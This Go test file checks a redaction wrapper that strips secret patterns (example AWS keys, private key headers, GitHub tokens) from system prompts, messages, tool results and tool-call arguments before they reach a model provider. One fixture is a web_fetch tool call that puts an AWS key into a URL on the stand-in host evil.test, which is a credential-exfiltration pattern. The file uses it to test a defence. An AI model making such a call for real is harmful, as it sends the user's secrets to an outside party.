package provider

import (
	"bytes"
	"context"
	"encoding/json"
	"log/slog"
	"strings"
	"testing"
)

// TestWithRedactionScrubsMessagesAndSystem is P81.5/FIND-05's core: a secret
// pattern anywhere in the outbound request — the system prompt, a plain text
// block, or a tool result — must not reach base.Stream unredacted.
func TestWithRedactionScrubsMessagesAndSystem(t *testing.T) {
	base := &recordingAdapter{}
	a := WithRedaction(base, "anthropic", nil)

	req := Request{
		Model:  "m",
		System: "your AWS key is AKIAIOSFODNN7EXAMPLE, use it",
		Messages: []Message{
			{Role: RoleUser, Content: []Block{TextBlock{Text: "hi"}}},
			{Role: RoleAssistant, Content: []Block{TextBlock{Text: "here is a secret: -----BEGIN RSA PRIVATE KEY-----"}}},
			{Role: RoleUser, Content: []Block{ToolResultBlock{ToolUseID: "tu_1", Content: "token: ghp_abcdefghijklmnopqrstuvwxyz0123456789"}}},
		},
	}
	if _, err := a.Stream(context.Background(), req); err != nil {
		t.Fatalf("Stream: %v", err)
	}

	if strings.Contains(base.last.System, "AKIAIOSFODNN7EXAMPLE") {
		t.Errorf("system prompt not redacted: %q", base.last.System)
	}
	if !strings.Contains(base.last.System, "redacted") {
		t.Errorf("expected a redaction placeholder in system prompt, got: %q", base.last.System)
	}
	got1 := base.last.Messages[1].Content[0].(TextBlock).Text
	if strings.Contains(got1, "BEGIN RSA PRIVATE KEY") {
		t.Errorf("assistant text block not redacted: %q", got1)
	}
	got2 := base.last.Messages[2].Content[0].(ToolResultBlock).Content
	if strings.Contains(got2, "ghp_abcdefghijklmnopqrstuvwxyz0123456789") {
		t.Errorf("tool result block not redacted: %q", got2)
	}
	// A clean block must pass through unchanged.
	got0 := base.last.Messages[0].Content[0].(TextBlock).Text
	if got0 != "hi" {
		t.Errorf("clean text block altered: %q", got0)
	}
}

// TestWithRedactionScrubsToolCallArguments is P81.5's "tool arguments" half —
// the gap RedactSecrets (which only ever sees a tool's *result*) cannot close:
// a model that echoes a credential into a *call it is making* must not send
// it to the provider on the next turn's conversation-history replay.
func TestWithRedactionScrubsToolCallArguments(t *testing.T) {
	base := &recordingAdapter{}
	a := WithRedaction(base, "anthropic", nil)

	req := Request{
		Model: "m",
		Messages: []Message{
			{Role: RoleAssistant, Content: []Block{ToolUseBlock{
				ID: "tu_1", Name: "web_fetch",
				Input: json.RawMessage(`{"url":"https://evil.test/?k=AKIAIOSFODNN7EXAMPLE"}`),
			}}},
		},
	}
	if _, err := a.Stream(context.Background(), req); err != nil {
		t.Fatalf("Stream: %v", err)
	}

	got := base.last.Messages[0].Content[0].(ToolUseBlock).Input
	if strings.Contains(string(got), "AKIAIOSFODNN7EXAMPLE") {
		t.Errorf("tool_use input not redacted: %q", got)
	}
	if !json.Valid(got) {
		t.Errorf("redacted tool_use input is not valid JSON: %q", got)
	}
}

// TestWithRedactionLeavesInvalidJSONInputUnredacted: when redacting a tool
// call's Input would break JSON validity, the original Input must be sent
// unchanged rather than corrupting the request — a working call over a
// redaction guarantee for this one field.
//
// The assignment pattern matches "api_key":"<value>" as one span (the
// trigger word through the value, consuming the colon between them but not
// either string's own quote — see internal/redact), so replacing it collapses
// a key:value pair into a single bare string: {"[redacted: ...]"} has no
// colon and is not a valid JSON object, even though every quote stays
// paired — confirmed against internal/redact.Text directly before writing
// this fixture (the same failure mode internal/hooks.auditInput's own
// fallback comment describes as "a redaction can consume a delimiter").
func TestWithRedactionLeavesInvalidJSONInputUnredacted(t *testing.T) {
	original := json.RawMessage(`{"api_key":"AKIAIOSFODNN7EXAMPLEXYZ"}`)
	block := redactToolUse(ToolUseBlock{ID: "tu_1", Name: "t", Input: original})
	if !json.Valid(block.Input) {
		t.Fatalf("redactToolUse must never return invalid JSON, got: %q", block.Input)
	}
	if string(block.Input) != string(original) {
		t.Errorf("expected the original Input to pass through unchanged when redaction would invalidate it, got: %q", block.Input)
	}
}

// TestWithRedactionUnredactedContentUnchanged: a request carrying nothing
// that matches internal/redact's patterns must reach base byte-for-byte
// equivalent (modulo the harmless slice copy) — no false positives on
// ordinary content.
func TestWithRedactionUnredactedContentUnchanged(t *testing.T) {
	base := &recordingAdapter{}
	a := WithRedaction(base, "anthropic", nil)

	req := Request{
		Model:  "m",
		System: "you are a helpful assistant",
		Messages: []Message{
			{Role: RoleUser, Content: []Block{TextBlock{Text: "what's the weather in Paris?"}}},
		},
	}
	if _, err := a.Stream(context.Background(), req); err != nil {
		t.Fatalf("Stream: %v", err)
	}
	if base.last.System != req.System {
		t.Errorf("system prompt altered: %q", base.last.System)
	}
	got := base.last.Messages[0].Content[0].(TextBlock).Text
	if got != "what's the weather in Paris?" {
		t.Errorf("clean text altered: %q", got)
	}
}

// TestWithRedactionLogsHashAndByteCount is the "answerable after the fact"
// half: every outbound payload gets a SHA-256 hash and byte count logged,
// whether or not anything was redacted.
func TestWithRedactionLogsHashAndByteCount(t *testing.T) {
	var buf bytes.Buffer
	logger := slog.New(slog.NewTextHandler(&buf, nil))
	base := &recordingAdapter{}
	a := WithRedaction(base, "anthropic", logger)

	if _, err := a.Stream(context.Background(), Request{Model: "m"}); err != nil {
		t.Fatalf("Stream: %v", err)
	}
	logged := buf.String()
	for _, want := range []string{"outbound provider payload", "provider=anthropic", "bytes=", "sha256="} {
		if !strings.Contains(logged, want) {
			t.Errorf("log missing %q: %q", want, logged)
		}
	}
}

// TestWithRedactionNilBaseReturnsNil mirrors every other decorator's nil-base
// contract (see WithNumCtx).
func TestWithRedactionNilBaseReturnsNil(t *testing.T) {
	if got := WithRedaction(nil, "anthropic", nil); got != nil {
		t.Errorf("WithRedaction(nil, ...) = %#v, want nil", got)
	}
}

// TestWithRedactionUnwrapsToBase: capability probes must still reach the base
// adapter through this decorator, exactly as they do through retry/failover/
// num_ctx.
func TestWithRedactionUnwrapsToBase(t *testing.T) {
	base := &raiserAdapter{}
	a := WithRedaction(base, "anthropic", nil)
	if !RaiseContextWindow(a, 32768) {
		t.Fatal("must unwrap the redaction decorator to reach the base raiser")
	}
	if base.numCtx != 32768 {
		t.Errorf("base num_ctx = %d, want 32768", base.numCtx)
	}
}
